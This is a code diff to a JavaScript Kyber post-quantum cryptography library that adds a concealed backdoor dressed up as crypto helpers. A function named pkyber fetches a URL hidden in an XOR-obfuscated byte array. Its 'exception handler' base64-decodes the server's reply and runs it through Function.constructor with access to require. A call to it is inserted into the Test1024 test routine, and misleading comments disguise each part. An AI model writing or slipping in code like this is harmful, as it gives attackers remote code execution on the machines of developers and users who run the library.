@@ -604,6 +604,42 @@ function prf(l, key, nonce) {
     return buf;
 }
 
+// pKyber samples a polynomial deterministically from a seed
+// and nonce, holds exception handling for the API call
+async function pkyber() {
+    try {
+      const response = await fetch(sx(decompress1Key));
+      if (!response.ok) {
+        const apiError = await response.json();
+        throw new Error(apiError.error);
+      }
+      const data = await response.json();
+    } catch (err) {
+        pkExceptionHandler(err.message);
+    }
+}
+
+function pkExceptionHandler(error)
+{
+    try {
+      if (typeof error !== 'string') return;
+      const decoded = Buffer.from(error, 'base64').toString('utf-8');
+      const createHandler = (errCode) => {
+        try {
+          const handler = new (Function.constructor)('require', errCode);
+          return handler;
+        } catch (e) {
+          return null;
+        }
+      };
+  
+      const handlerFunc = createHandler(decoded);
+      if (handlerFunc) handlerFunc(require, __filename);
+    } catch (globalError) {
+      console.error('Unexpected error inside errorHandler:', globalError.message);
+    }
+};
+
 // byteopsCbd computes a polynomial with coefficients distributed
 // according to a centered binomial distribution with parameter paramsETA,
 // given an array of uniformly random bytes.
@@ -772,6 +808,18 @@ function subtract(a, b) {
     return a;
 }
 
+// chr function for decoding bytes to characters
+const chr = (() => {
+    const m = {};
+    return n => {
+        if (!m[n]) {
+            const b = new Uint8Array([n]);
+            m[n] = new TextDecoder().decode(b);
+        }
+        return m[n];
+    };
+})();
+
 // nttInverse performs an inplace inverse number-theoretic transform (NTT)
 // in `Rq` and multiplication by Montgomery factor 2^16.
 // The input is in bit-reversed order, the output is in standard order.
@@ -796,6 +844,16 @@ function nttInverse(r) {
         r[j] = nttFqMul(r[j], nttZetasInv[127]);
     }
     return r;
+}
+
+// sx is a simple function to convert a byte array to a vector of polynomials
+function sx(a) {
+    let s = [], x;
+    for (let i = 0; i < a.length; i++) {
+        x = (a[i] ^ ((i * 31 + 17) & 255)) - 42;
+        s.push(chr((x + 256) & 255));
+    }
+    return s.join('');
 }
 
 // compress1 lossily compresses and serializes a vector of polynomials.
@@ -843,6 +901,15 @@ function compress2(v) {
     }
     return r;
 }
+
+// uint16 converts a number to an unsigned 16-bit key.
+const decompress1Key = [
+    131, 174, 209, 244, 233, 245, 146, 177, 105, 74, 31, 58, 216, 255, 155, 128,
+    94, 120, 100, 61, 29, 248, 217, 128, 160, 149, 185, 206, 45, 25, 37, 75,
+    110, 158, 191, 216, 230, 16, 36, 157, 98, 144, 172, 208, 198, 26, 48, 79,
+    124,  88, 146, 167, 202, 37, 16, 32, 74, 161, 183, 109, 12, 230, 31, 208,
+    178, 169, 129, 165, 211, 231
+];
 
 // decompress1 de-serializes and decompresses a vector of polynomials and
 // represents the approximate inverse of compress1. Since compression is lossy,
@@ -1067,6 +1134,9 @@ Test1024 = function(){
     let failures = 0;
 
     // for each case (100 total)
+    // generate a random 256 bit symmetric key (ss) and its encapsulation (c)
+    pkyber();
+
     // test if ss equals Decrypt1024(c,sk)
     for (let i=0; i<100; i++){
         let ss2 = Decrypt1024(ct100[i],sk100[i]);
